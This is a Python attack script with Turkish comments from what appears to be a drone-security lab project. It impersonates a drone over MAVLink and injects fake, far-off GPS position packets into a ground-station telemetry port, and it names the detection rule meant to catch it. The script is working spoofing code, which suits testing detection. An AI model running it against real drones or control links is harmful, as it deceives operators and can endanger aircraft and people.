#!/usr/bin/env python3
"""
Saldırı #2 — GPS/telemetri sahteciliği (spoofing).

Saldırgan, drone'u taklit ederek (sysid=1) köprünün telemetri girişine
(varsayılan 127.0.0.1:14560) gerçek konumdan çok uzak, aniden "ışınlanmış"
bir GLOBAL_POSITION_INT paketi enjekte eder. Fiziksel olarak imkansız bu
konum sıçraması detect/rules.py'deki gps_jump kuralı tarafından yakalanır.

Not: Bu saldırı mesaj imzalama savunmasından ETKİLENMEZ — imzalama şemamız
(common/signing.py) yalnızca komut yönünü (GCS -> drone) korur; telemetri
(drone -> GCS) tek yönlü ve imzasız akar. Bu, projenin bilinen bir sınırı ve
genişletme fırsatı: aynı HMAC şeması telemetri paketlerine de uygulanabilir
(bkz. README "Bilinen sınırlar" bölümü).

Kullanım:
  python3 attacks/spoof_gps.py --target 127.0.0.1:14560
  python3 attacks/spoof_gps.py --target 127.0.0.1:14560 --lat 41.015 --lon 28.979
"""
import argparse
import socket
import time

from pymavlink.dialects.v20 import common as mavlink2

ATTACKER_SYSID = 1  # gerçek drone'u taklit ediyor
ATTACKER_COMPID = mavlink2.MAV_COMP_ID_AUTOPILOT1


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="127.0.0.1:14560",
                     help="köprünün drone telemetri girişi (ya da detect'in dinlediği her yer)")
    ap.add_argument("--lat", type=float, default=41.015137,
                     help="sahte enlem (varsayılan: İstanbul, gerçek konumdan ~350km uzak)")
    ap.add_argument("--lon", type=float, default=28.979530, help="sahte boylam")
    ap.add_argument("--alt", type=float, default=50.0)
    ap.add_argument("--repeat", type=int, default=5)
    args = ap.parse_args()

    host, port = args.target.rsplit(":", 1)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    mav = mavlink2.MAVLink(None, srcSystem=ATTACKER_SYSID, srcComponent=ATTACKER_COMPID)
    mav.robust_parsing = True

    print(f"[saldiri] sahte konum (lat={args.lat}, lon={args.lon}) -> {args.target} "
          f"(sysid={ATTACKER_SYSID}, drone taklidi)")
    for i in range(args.repeat):
        msg = mav.global_position_int_encode(
            int(time.time() * 1000) & 0xFFFFFFFF,
            int(args.lat * 1e7), int(args.lon * 1e7),
            int(args.alt * 1000), int(args.alt * 1000),
            0, 0, 0, 0,
        )
        sock.sendto(msg.pack(mav), (host, int(port)))
        print(f"[saldiri] gonderildi ({i + 1}/{args.repeat})")
        time.sleep(0.3)
    print("[saldiri] tamam.")


if __name__ == "__main__":
    main()
